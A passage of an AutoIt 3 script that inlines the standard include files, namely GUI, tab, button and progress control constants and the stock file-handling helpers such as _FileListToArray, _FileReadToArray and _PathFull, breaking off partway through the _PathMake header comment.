Global Const $TVM_SORTCHILDREN		= $TV_FIRST + 19
Global Const $TVM_ENSUREVISIBLE		= $TV_FIRST + 20
Global Const $TVM_SETBKCOLOR		= $TV_FIRST + 29
Global Const $TVM_SETTEXTCOLOR		= $TV_FIRST + 30
Global Const $TVM_GETBKCOLOR		= $TV_FIRST + 31
Global Const $TVM_GETTEXTCOLOR		= $TV_FIRST + 32
Global Const $TVM_SETLINECOLOR		= $TV_FIRST + 40
Global Const $TVM_GETLINECOLOR		= $TV_FIRST + 41

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\TreeViewConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\UpDownConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1
; Language:       English
; Description:    UpDown Constants.
;
; ------------------------------------------------------------------------------

; Styles
Global Const $UDS_WRAP 				= 0x0001
Global Const $UDS_SETBUDDYINT		= 0x0002
Global Const $UDS_ALIGNRIGHT 		= 0x0004
Global Const $UDS_ALIGNLEFT			= 0x0008
Global Const $UDS_ARROWKEYS 		= 0x0020
Global Const $UDS_HORZ 				= 0x0040
Global Const $UDS_NOTHOUSANDS 		= 0x0080

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\UpDownConstants.au3>
; ----------------------------------------------------------------------------


; Control default styles
Global Const $GUI_SS_DEFAULT_AVI		= $ACS_TRANSPARENT
Global Const $GUI_SS_DEFAULT_BUTTON		= 0
Global Const $GUI_SS_DEFAULT_CHECKBOX	= 0
Global Const $GUI_SS_DEFAULT_COMBO		= BitOR($CBS_DROPDOWN, $CBS_AUTOHSCROLL, $WS_VSCROLL)
Global Const $GUI_SS_DEFAULT_DATE		= $DTS_LONGDATEFORMAT
Global Const $GUI_SS_DEFAULT_EDIT		= BitOR($ES_WANTRETURN, $WS_VSCROLL, $WS_HSCROLL, $ES_AUTOVSCROLL, $ES_AUTOHSCROLL)
Global Const $GUI_SS_DEFAULT_GRAPHIC	= 0
Global Const $GUI_SS_DEFAULT_GROUP		= 0
Global Const $GUI_SS_DEFAULT_ICON		= $SS_NOTIFY
Global Const $GUI_SS_DEFAULT_INPUT		= BitOR($ES_LEFT, $ES_AUTOHSCROLL)
Global Const $GUI_SS_DEFAULT_LABEL		= 0
Global Const $GUI_SS_DEFAULT_LIST		= BitOR($LBS_SORT, $WS_BORDER, $WS_VSCROLL, $LBS_NOTIFY)
Global Const $GUI_SS_DEFAULT_LISTVIEW	= BitOR($LVS_SHOWSELALWAYS, $LVS_SINGLESEL)
Global Const $GUI_SS_DEFAULT_MONTHCAL	= 0
Global Const $GUI_SS_DEFAULT_PIC		= $SS_NOTIFY
Global Const $GUI_SS_DEFAULT_PROGRESS	= 0
Global Const $GUI_SS_DEFAULT_RADIO		= 0
Global Const $GUI_SS_DEFAULT_SLIDER		= $TBS_AUTOTICKS
Global Const $GUI_SS_DEFAULT_TAB		= 0
Global Const $GUI_SS_DEFAULT_TREEVIEW	= BitOR($TVS_HASBUTTONS, $TVS_HASLINES, $TVS_LINESATROOT, $TVS_DISABLEDRAGDROP, $TVS_SHOWSELALWAYS)
Global Const $GUI_SS_DEFAULT_UPDOWN		= $UDS_ALIGNRIGHT
Global Const $GUI_SS_DEFAULT_GUI		= BitOR($WS_MINIMIZEBOX, $WS_CAPTION, $WS_POPUP, $WS_SYSMENU)

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\GUIDefaultConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\GUIConstantsEx.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    Constants to be used in GUI applications.
;
; ------------------------------------------------------------------------------


; Events and messages
Global Const $GUI_EVENT_CLOSE			= -3
Global Const $GUI_EVENT_MINIMIZE		= -4
Global Const $GUI_EVENT_RESTORE			= -5
Global Const $GUI_EVENT_MAXIMIZE		= -6
Global Const $GUI_EVENT_PRIMARYDOWN		= -7
Global Const $GUI_EVENT_PRIMARYUP		= -8
Global Const $GUI_EVENT_SECONDARYDOWN	= -9
Global Const $GUI_EVENT_SECONDARYUP		= -10
Global Const $GUI_EVENT_MOUSEMOVE		= -11
Global Const $GUI_EVENT_RESIZED			= -12
Global Const $GUI_EVENT_DROPPED			= -13

Global Const $GUI_RUNDEFMSG				= 'GUI_RUNDEFMSG'

; State
Global Const $GUI_AVISTOP		= 0
Global Const $GUI_AVISTART		= 1
Global Const $GUI_AVICLOSE		= 2

Global Const $GUI_CHECKED		= 1
Global Const $GUI_INDETERMINATE	= 2
Global Const $GUI_UNCHECKED		= 4

Global Const $GUI_DROPACCEPTED	= 8
Global Const $GUI_NODROPACCEPTED = 4096
Global Const $GUI_ACCEPTFILES	= $GUI_DROPACCEPTED	; to be suppressed

Global Const $GUI_SHOW			= 16
Global Const $GUI_HIDE 			= 32
Global Const $GUI_ENABLE		= 64
Global Const $GUI_DISABLE		= 128

Global Const $GUI_FOCUS			= 256
Global Const $GUI_NOFOCUS		= 8192
Global Const $GUI_DEFBUTTON		= 512

Global Const $GUI_EXPAND		= 1024
Global Const $GUI_ONTOP			= 2048


; Font
Global Const $GUI_FONTITALIC	= 2
Global Const $GUI_FONTUNDER		= 4
Global Const $GUI_FONTSTRIKE	= 8


; Resizing
Global Const $GUI_DOCKAUTO			= 0x0001
Global Const $GUI_DOCKLEFT			= 0x0002
Global Const $GUI_DOCKRIGHT			= 0x0004
Global Const $GUI_DOCKHCENTER		= 0x0008
Global Const $GUI_DOCKTOP			= 0x0020
Global Const $GUI_DOCKBOTTOM		= 0x0040
Global Const $GUI_DOCKVCENTER		= 0x0080
Global Const $GUI_DOCKWIDTH			= 0x0100
Global Const $GUI_DOCKHEIGHT		= 0x0200

Global Const $GUI_DOCKSIZE			= 0x0300	; width+height
Global Const $GUI_DOCKMENUBAR		= 0x0220	; top+height
Global Const $GUI_DOCKSTATEBAR		= 0x0240	; bottom+height
Global Const $GUI_DOCKALL			= 0x0322	; left+top+width+height
Global Const $GUI_DOCKBORDERS		= 0x0066	; left+top+right+bottom

; Graphic
Global Const $GUI_GR_CLOSE		= 1
Global Const $GUI_GR_LINE		= 2
Global Const $GUI_GR_BEZIER		= 4
Global Const $GUI_GR_MOVE		= 6
Global Const $GUI_GR_COLOR		= 8
Global Const $GUI_GR_RECT		= 10
Global Const $GUI_GR_ELLIPSE	= 12
Global Const $GUI_GR_PIE		= 14
Global Const $GUI_GR_DOT		= 16
Global Const $GUI_GR_PIXEL		= 18
Global Const $GUI_GR_HINT		= 20
Global Const $GUI_GR_REFRESH	= 22
Global Const $GUI_GR_PENSIZE	= 24
Global Const $GUI_GR_NOBKCOLOR	= -2

; Background color special flags
Global Const $GUI_BKCOLOR_DEFAULT = -1
Global Const $GUI_BKCOLOR_TRANSPARENT = -2
Global Const $GUI_BKCOLOR_LV_ALTERNATE = 0xFE000000

; Other
Global Const $GUI_WS_EX_PARENTDRAG =      0x00100000

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\GUIConstantsEx.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\WindowsConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\WindowsConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ComboConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ComboConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ListViewConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ListViewConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\StaticConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\StaticConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ButtonConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    Button (Group, Radio, Checkbox, Button) Constants.
;
; ------------------------------------------------------------------------------

; Group
Global Const $BS_GROUPBOX		= 0x0007

; Button
Global Const $BS_BOTTOM			= 0x0800
Global Const $BS_CENTER			= 0x0300
Global Const $BS_DEFPUSHBUTTON	= 0x0001
Global Const $BS_LEFT			= 0x0100
Global Const $BS_MULTILINE		= 0x2000
Global Const $BS_PUSHBOX		= 0x000A
Global Const $BS_PUSHLIKE		= 0x1000
Global Const $BS_RIGHT			= 0x0200
Global Const $BS_RIGHTBUTTON	= 0x0020
Global Const $BS_TOP			= 0x0400
Global Const $BS_VCENTER		= 0x0C00
Global Const $BS_FLAT			= 0x8000
Global Const $BS_ICON			= 0x0040
Global Const $BS_BITMAP			= 0x0080

; Checkbox
Global Const $BS_3STATE			= 0x0005
Global Const $BS_AUTO3STATE		= 0x0006
Global Const $BS_AUTOCHECKBOX	= 0x0003
Global Const $BS_CHECKBOX		= 0x0002

; Radio
Global Const $BS_AUTORADIOBUTTON	= 0x0009

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ButtonConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ListBoxConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ListBoxConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\TabConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    Tab Constants.
;
; ------------------------------------------------------------------------------
; Styles
Global Const $TCS_SCROLLOPPOSITE	= 0x0001
Global Const $TCS_BOTTOM			= 0x0002
Global Const $TCS_RIGHT				= 0x0002
Global Const $TCS_MULTISELECT		= 0x0004
Global Const $TCS_FLATBUTTONS		= 0x0008
Global Const $TCS_FORCEICONLEFT		= 0x0010
Global Const $TCS_FORCELABELLEFT	= 0x0020
Global Const $TCS_HOTTRACK			= 0x0040
Global Const $TCS_VERTICAL			= 0x0080
Global Const $TCS_TABS				= 0x0000
Global Const $TCS_BUTTONS			= 0x0100
Global Const $TCS_SINGLELINE		= 0x0000
Global Const $TCS_MULTILINE			= 0x0200
Global Const $TCS_RIGHTJUSTIFY		= 0x0000
Global Const $TCS_FIXEDWIDTH		= 0x0400
Global Const $TCS_RAGGEDRIGHT		= 0x0800
Global Const $TCS_FOCUSONBUTTONDOWN = 0x1000
Global Const $TCS_OWNERDRAWFIXED	= 0x2000
Global Const $TCS_TOOLTIPS			= 0x4000
Global Const $TCS_FOCUSNEVER		= 0x8000

; Tab Extended Styles
Global Const $TCS_EX_FLATSEPARATORS 	= 0x1
;Global Const $TCS_EX_REGISTERDROP 		= 0x2

; Error checking
Global Const $TC_ERR = -1

; event(s)
Global Const $TCIS_BUTTONPRESSED = 0x1

; extended styles
;~ Global Const $TCS_EX_FLATSEPARATORS = 0x1
Global Const $TCS_EX_REGISTERDROP = 0x2

; Messages to send to Tab control
Global Const $TCM_FIRST = 0x1300
Global Const $TCM_DELETEALLITEMS = ($TCM_FIRST + 9)
Global Const $TCM_DELETEITEM = ($TCM_FIRST + 8)
Global Const $TCM_DESELECTALL = ($TCM_FIRST + 50)
Global Const $TCM_GETCURFOCUS = ($TCM_FIRST + 47)
Global Const $TCM_GETCURSEL = ($TCM_FIRST + 11)
Global Const $TCM_GETEXTENDEDSTYLE = ($TCM_FIRST + 53)
Global Const $TCM_GETITEMCOUNT = ($TCM_FIRST + 4)
Global Const $TCM_GETITEMRECT = ($TCM_FIRST + 10)
Global Const $TCM_GETROWCOUNT = ($TCM_FIRST + 44)
Global Const $TCM_SETITEMSIZE = $TCM_FIRST + 41

Global Const $TCCM_FIRST = 0X2000
Global Const $TCCM_GETUNICODEFORMAT = ($TCCM_FIRST + 6)
Global Const $TCM_GETUNICODEFORMAT = $TCCM_GETUNICODEFORMAT

Global Const $TCM_HIGHLIGHTITEM = ($TCM_FIRST + 51)
Global Const $TCM_SETCURFOCUS = ($TCM_FIRST + 48)
Global Const $TCM_SETCURSEL = ($TCM_FIRST + 12)
Global Const $TCM_SETMINTABWIDTH = ($TCM_FIRST + 49)
Global Const $TCM_SETPADDING = ($TCM_FIRST + 43)

Global Const $TCCM_SETUNICODEFORMAT = ($TCCM_FIRST + 5)
Global Const $TCM_SETUNICODEFORMAT = $TCCM_SETUNICODEFORMAT

Global Const $TCN_FIRST = -550
Global Const $TCN_SELCHANGE = ($TCN_FIRST - 1)
Global Const $TCN_SELCHANGING = ($TCN_FIRST - 2)

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\TabConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\EditConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\EditConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\DateTimeConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\DateTimeConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\SliderConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\SliderConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\TreeViewConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\TreeViewConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ProgressConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    Progress Constants.
;
; ------------------------------------------------------------------------------

; Styles
Global Const $PBS_SMOOTH	= 1
Global Const $PBS_VERTICAL	= 4

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ProgressConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\AVIConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\AVIConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\UpDownConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\UpDownConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\GUIConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\file.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.0
; Language:       English
; Description:    Functions that assist with files and directories.
;
; ------------------------------------------------------------------------------


;===============================================================================
;
; Description:      Returns the number of lines in the specified file.
; Syntax:           _FileCountLines( $sFilePath )
; Parameter(s):     $sFilePath - Path and filename of the file to be read
; Requirement(s):   None
; Return Value(s):  On Success - Returns number of lines in the file
;                   On Failure - Returns 0 and sets @error = 1
; Author(s):        Tylo <tylo at start dot no>
; Note(s):          It does not count a final @LF as a line.
;
;===============================================================================
Func _FileCountLines($sFilePath)
	Local $N = FileGetSize($sFilePath) - 1
	If @error Or $N = -1 Then Return 0
	Return StringLen(StringAddCR(FileRead($sFilePath, $N))) - $N + 1
EndFunc   ;==>_FileCountLines


;===============================================================================
;
; Description:      Creates or zero's out the length of the file specified.
; Syntax:           _FileCreate( $sFilePath )
; Parameter(s):     $sFilePath - Path and filename of the file to be created
; Requirement(s):   None
; Return Value(s):  On Success - Returns 1
;                   On Failure - Returns 0 and sets:
;                                @error = 1: Error opening specified file
;                                @error = 2: File could not be written to
; Author(s):        Brian Keene <brian_keene at yahoo dot com>
; Note(s):          None
;
;===============================================================================
Func _FileCreate($sFilePath)
	;==============================================
	; Local Constant/Variable Declaration Section
	;==============================================
	Local $hOpenFile
	Local $hWriteFile

	$hOpenFile = FileOpen($sFilePath, 2)

	If $hOpenFile = -1 Then
		SetError(1)
		Return 0
	EndIf

	$hWriteFile = FileWrite($hOpenFile, "")

	If $hWriteFile = -1 Then
		SetError(2)
		Return 0
	EndIf

	FileClose($hOpenFile)
	Return 1
EndFunc   ;==>_FileCreate

;===============================================================================
;
; Description:      lists all files and folders in a specified path (Similar to using Dir with the /B Switch)
; Syntax:           _FileListToArray($sPath, $sFilter = "*", $iFlag = 0)
; Parameter(s):    	$sPath = Path to generate filelist for
;                   $iFlag = determines weather to return file or folders or both
;					$sFilter = The filter to use. Search the Autoit3 manual for the word "WildCards" For details
;						$iFlag=0(Default) Return both files and folders
;                       $iFlag=1 Return files Only
;						$iFlag=2 Return Folders Only
;
; Requirement(s):   None
; Return Value(s):  On Success - Returns an array containing the list of files and folders in the specified path
;                        On Failure - Returns the an empty string "" if no files are found and sets @Error on errors
;						@Error=1 Path not found or invalid
;						@Error=2 Invalid $sFilter
;                       @Error=3 Invalid $iFlag
;                 @Error=4 No File(s) Found
;
; Author(s):        SolidSnake <MetalGX91 at GMail dot com>
; Note(s):			The array returned is one-dimensional and is made up as follows:
;					$array[0] = Number of Files\Folders returned
;					$array[1] = 1st File\Folder
;					$array[2] = 2nd File\Folder
;					$array[3] = 3rd File\Folder
;					$array[n] = nth File\Folder
;
;					Special Thanks to Helge and Layer for help with the $iFlag update
;===============================================================================
Func _FileListToArray($sPath, $sFilter = "*", $iFlag = 0)
	Local $hSearch, $sFile, $asFileList[1]
	If Not FileExists($sPath) Then Return SetError(1, 1, "")
	If (StringInStr($sFilter, "\")) Or (StringInStr($sFilter, "/")) Or (StringInStr($sFilter, ":")) Or (StringInStr($sFilter, ">")) Or (StringInStr($sFilter, "<")) Or (StringInStr($sFilter, "|")) Or (StringStripWS($sFilter, 8) = "") Then Return SetError(2, 2, "")
	If Not ($iFlag = 0 Or $iFlag = 1 Or $iFlag = 2) Then Return SetError(3, 3, "")
	$hSearch = FileFindFirstFile($sPath & "\" & $sFilter)
	If $hSearch = -1 Then Return SetError(4, 4, "")
	While 1
		$sFile = FileFindNextFile($hSearch)
		If @error Then
			SetError(0)
			ExitLoop
		EndIf
		If $iFlag = 1 And StringInStr(FileGetAttrib($sPath & "\" & $sFile), "D") <> 0 Then ContinueLoop
		If $iFlag = 2 And StringInStr(FileGetAttrib($sPath & "\" & $sFile), "D") = 0 Then ContinueLoop
		ReDim $asFileList[UBound($asFileList) + 1]
		$asFileList[0] = $asFileList[0] + 1
		$asFileList[UBound($asFileList) - 1] = $sFile
	WEnd
	FileClose($hSearch)
	Return $asFileList
EndFunc   ;==>_FileListToArray

;===============================================================================
; Function Name:   _FilePrint()
; Description:     Prints a plain text file.
; Syntax:          _FilePrint ( $s_File [, $i_Show] )
;
; Parameter(s):    $s_File     = The file to print.
;                  $i_Show     = The state of the window. (default = @SW_HIDE)
;
; Requirement(s):  External:   = shell32.dll (it's already in system32).
;                  Internal:   = None.
;
; Return Value(s): On Success: = Returns 1.
;                  On Failure: = Returns 0 and sets @error according to the global constants list.
;
; Author(s):       erifash <erifash [at] gmail [dot] com>
;
; Note(s):         Uses the ShellExecute function of shell32.dll.
;
; Example(s):
;   _FilePrint("C:\file.txt")
;===============================================================================
Func _FilePrint($s_File, $i_Show = @SW_HIDE)
	Local $a_Ret = DllCall("shell32.dll", "long", "ShellExecute", _
			"hwnd", 0, _
			"string", "print", _
			"string", $s_File, _
			"string", "", _
			"string", "", _
			"int", $i_Show)
	If $a_Ret[0] > 32 And Not @error Then
		Return 1
	Else
		SetError($a_Ret[0])
		Return 0
	EndIf
EndFunc   ;==>_FilePrint

;===============================================================================
;
; Description:      Reads the specified file into an array.
; Syntax:           _FileReadToArray( $sFilePath, $aArray )
; Parameter(s):     $sFilePath - Path and filename of the file to be read
;                   $aArray    - The array to store the contents of the file
; Requirement(s):   None
; Return Value(s):  On Success - Returns 1
;                   On Failure - Returns 0 and sets @error = 1
; Author(s):        Jonathan Bennett <jon at hiddensoft dot com>
; Note(s):          None
;
;===============================================================================
Func _FileReadToArray($sFilePath, ByRef $aArray)
	;==============================================
	; Local Constant/Variable Declaration Section
	;==============================================
	Local $hFile

	$hFile = FileOpen($sFilePath, 0)

	If $hFile = -1 Then
		SetError(1)
		Return 0
	EndIf

	$aArray = StringSplit(StringStripCR(FileRead($hFile, FileGetSize($sFilePath))), @LF)

	FileClose($hFile)
	Return 1
EndFunc   ;==>_FileReadToArray

;===============================================================================
;
; Description:      Write array to File.
; Syntax:           _FileWriteFromArray( $sFilePath, $aArray )
; Parameter(s):     $sFilePath - Path and filename of the file to be written
;                   $a_Array   - The array to retrieve the contents
;                   $i_Base    - Start reading at this Array entry.
;                   $I_Ubound  - End reading at this Array entry.
;                                Default UBound($a_Array) - 1
; Requirement(s):   None
; Return Value(s):  On Success - Returns 1
;                   On Failure - Returns 0 and sets @error = 1
; Author(s):        Jos van der Zande <jdeb at autoitscript dot com>
; Note(s):          None
;
;===============================================================================
Func _FileWriteFromArray($sFilePath, $a_Array, $i_Base = 0, $i_UBound = 0)
	;==============================================
	; Local Constant/Variable Declaration Section
	;==============================================
	Local $hFile
	; Check if we have a valid array as input
	If Not IsArray($a_Array) Then
		SetError(2)
		Return 0
	EndIf
	; determine last entry
	Local $last = UBound($a_Array) - 1
	If $i_UBound < 1 Or $i_UBound > $last Then $i_UBound = $last
	If $i_Base < 0 Or $i_Base > $last Then $i_Base = 0
	; Open output file
	$hFile = FileOpen($sFilePath, 2)

	If $hFile = -1 Then
		SetError(1)
		Return 0
	EndIf
	;
	FileWrite($hFile, $a_Array[$i_Base])
	For $x = $i_Base + 1 To $i_UBound
		FileWrite($hFile, @CRLF & $a_Array[$x])
	Next

	FileClose($hFile)
	Return 1
EndFunc   ;==>_FileWriteFromArray

;===============================================================================
;
; Description:      Writes the specified text to a log file.
; Syntax:           _FileWriteLog( $sLogPath, $sLogMsg )
; Parameter(s):     $sLogPath - Path and filename to the log file
;                   $sLogMsg  - Message to be written to the log file
; Requirement(s):   None
; Return Value(s):  On Success - Returns 1
;                   On Failure - Returns 0 and sets:
;                                @error = 1: Error opening specified file
;                                @error = 2: File could not be written to
; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
; Note(s):          If the text to be appended does NOT end in @CR or @LF then
;                   a DOS linefeed (@CRLF) will be automatically added.
;
;===============================================================================
Func _FileWriteLog($sLogPath, $sLogMsg)
	;==============================================
	; Local Constant/Variable Declaration Section
	;==============================================
	Local $sDateNow
	Local $sTimeNow
	Local $sMsg
	Local $hOpenFile
	Local $hWriteFile

	$sDateNow = @YEAR & "-" & @MON & "-" & @MDAY
	$sTimeNow = @HOUR & ":" & @MIN & ":" & @SEC
	$sMsg = $sDateNow & " " & $sTimeNow & " : " & $sLogMsg

	$hOpenFile = FileOpen($sLogPath, 1)

	If $hOpenFile = -1 Then
		SetError(1)
		Return 0
	EndIf

	$hWriteFile = FileWriteLine($hOpenFile, $sMsg)

	If $hWriteFile = -1 Then
		SetError(2)
		Return 0
	EndIf

	FileClose($hOpenFile)
	Return 1
EndFunc   ;==>_FileWriteLog

;========================================
;Function name:       _FileWriteToLine
;Description:         Write text to specified line in a file
;Parameters:
;                     $sFile - The file to write to
;                     $iLine - The line number to write to
;                     $sText - The text to write
;                     $fOverWrite - if set to 1 will overwrite the old line
;                     if set to 0 will not overwrite
;Requirement(s):      None
;Return Value(s):     On success - 1
;                      On Failure - 0 And sets @ERROR
;                                @ERROR = 1 - File has less lines than $iLine
;                                @ERROR = 2 - File does not exist
;                                @ERROR = 3 - Error opening file
;                                @ERROR = 4 - $iLine is invalid
;                                @ERROR = 5 - $fOverWrite is invalid
;                                @ERROR = 6 - $sText is invalid
;Author(s):           cdkid
;Note(s):
;=========================================
Func _FileWriteToLine($sFile, $iLine, $sText, $fOverWrite = 0)
	If $iLine <= 0 Then
		SetError(4)
		Return 0
	EndIf
	If Not IsString($sText) Then
		SetError(6)
		Return 0
	EndIf
	If $fOverWrite <> 0 And $fOverWrite <> 1 Then
		SetError(5)
		Return 0
	EndIf
	If Not FileExists($sFile) Then
		SetError(2)
		Return 0
	EndIf
	Local $filtxt = FileRead($sFile, FileGetSize($sFile))
	$filtxt = StringSplit($filtxt, @CRLF, 1)
	If UBound($filtxt, 1) < $iLine Then
		SetError(1)
		Return 0
	EndIf
	Local $fil = FileOpen($sFile, 2)
	If $fil = -1 Then
		SetError(3)
		Return 0
	EndIf
	For $i = 1 To UBound($filtxt) - 1
		If $i = $iLine Then
			If $fOverWrite = 1 Then
				If $sText <> '' Then
					FileWrite($fil, $sText & @CRLF)
				Else
					FileWrite($fil, $sText)
				EndIf
			EndIf
			If $fOverWrite = 0 Then
				FileWrite($fil, $sText & @CRLF)
				FileWrite($fil, $filtxt[$i] & @CRLF)
			EndIf
		ElseIf $i < UBound($filtxt, 1) - 1 Then
			FileWrite($fil, $filtxt[$i] & @CRLF)
		ElseIf $i = UBound($filtxt, 1) - 1 Then
			FileWrite($fil, $filtxt[$i])
		EndIf
	Next
	FileClose($fil)
	Return 1
EndFunc   ;==>_FileWriteToLine

;===============================================================================
;
; Description:      Treats ..\ as Returns a path after processing the directory change operator .. to move the path up
;                                one level.
; Syntax:           _PathFull($sRelativePath, $sBasePath = @WorkingDir)
; Parameter(s):     $sRelativePath - The path to process.
;                            $sBasePath$sType - A base path to use if an absolute path is not provided.  This defaults to the
;                                current working directory.
; Requirement(s):   None
; Return Value(s):  The expanded path, the root drive or $sBasePath depending on how it's called.
; Author(s):        Valik (Original function and modification to rewrite)
;                        tittoproject (Rewrite)
; Note(s):          UNC paths are supported.
;                   Pass "\" to get the root drive of $sBasePath.
;                   Pass "" or "." to return $sBasePath.
;                   A relative path will be built relative to $sBasePath.  To bypass this behavior, use an absolute path.
;
;===============================================================================
Func _PathFull($sRelativePath, $sBasePath = @WorkingDir)
	If Not $sRelativePath Or $sRelativePath = "." Then Return $sBasePath

	; Normalize slash direction.
	Local $sFullPath = StringReplace($sRelativePath, "/", "\")
	Local $sPath = StringLeft($sFullPath, 2)

	; Check to see if the path is all slashes.  If so, return the root drive.
	StringReplace($sFullPath, "\", "")
	If @extended = StringLen($sFullPath) Then Return StringLeft($sBasePath, 2) & "\"

	; Check for UNC paths or local drives.
	If StringLeft($sFullPath, 1) = "\" Then
		If $sPath = "\\" Then
			$sFullPath = StringTrimLeft($sFullPath, 2)
			$sPath &= StringLeft($sFullPath, StringInStr($sFullPath, "\") - 1)
		Else
			$sPath = StringLeft($sBasePath, 2)
		EndIf
	ElseIf Not StringInStr($sPath, ":") Then
		$sFullPath = $sBasePath & "\" & $sFullPath
		$sPath = StringLeft($sBasePath, 2)
	EndIf

	; Build an array of the path parts we want to use.
	Local $aTemp = StringSplit($sFullPath, "\")
	Local $aPathParts[$aTemp[0]], $j = 0
	For $i = 2 To $aTemp[0]
		If $aTemp[$i] = ".." Then
			If $j Then $j -= 1
		ElseIf Not ($aTemp[$i] = "" And $i <> $aTemp[0]) And $aTemp[$i] <> "." Then
			$aPathParts[$j] = $aTemp[$i]
			$j += 1
		EndIf
	Next

	; Build the path from the parts.
	$sFullPath = $sPath
	For $i = 0 To $j - 1
		$sFullPath &= "\" & $aPathParts[$i]
	Next

	; Clean up the path.
	While StringInStr($sFullPath, ".\")
		$sFullPath = StringReplace($sFullPath, ".\", "\")
	WEnd
	Return $sFullPath
EndFunc   ;==>_PathFull

; ===================================================================
; Author: Valik
;
; _PathMake($szDrive, $szDir, $szFName, $szExt)
;
; Creates a string containing the path from drive, directory, file name and file extension parts.  Not all parts must be
;	passed. The path will still be built with what is passed.  This doesn't check the validity of the path
;	created, it could contain characters which are invalid on your filesystem.
; Parameters:
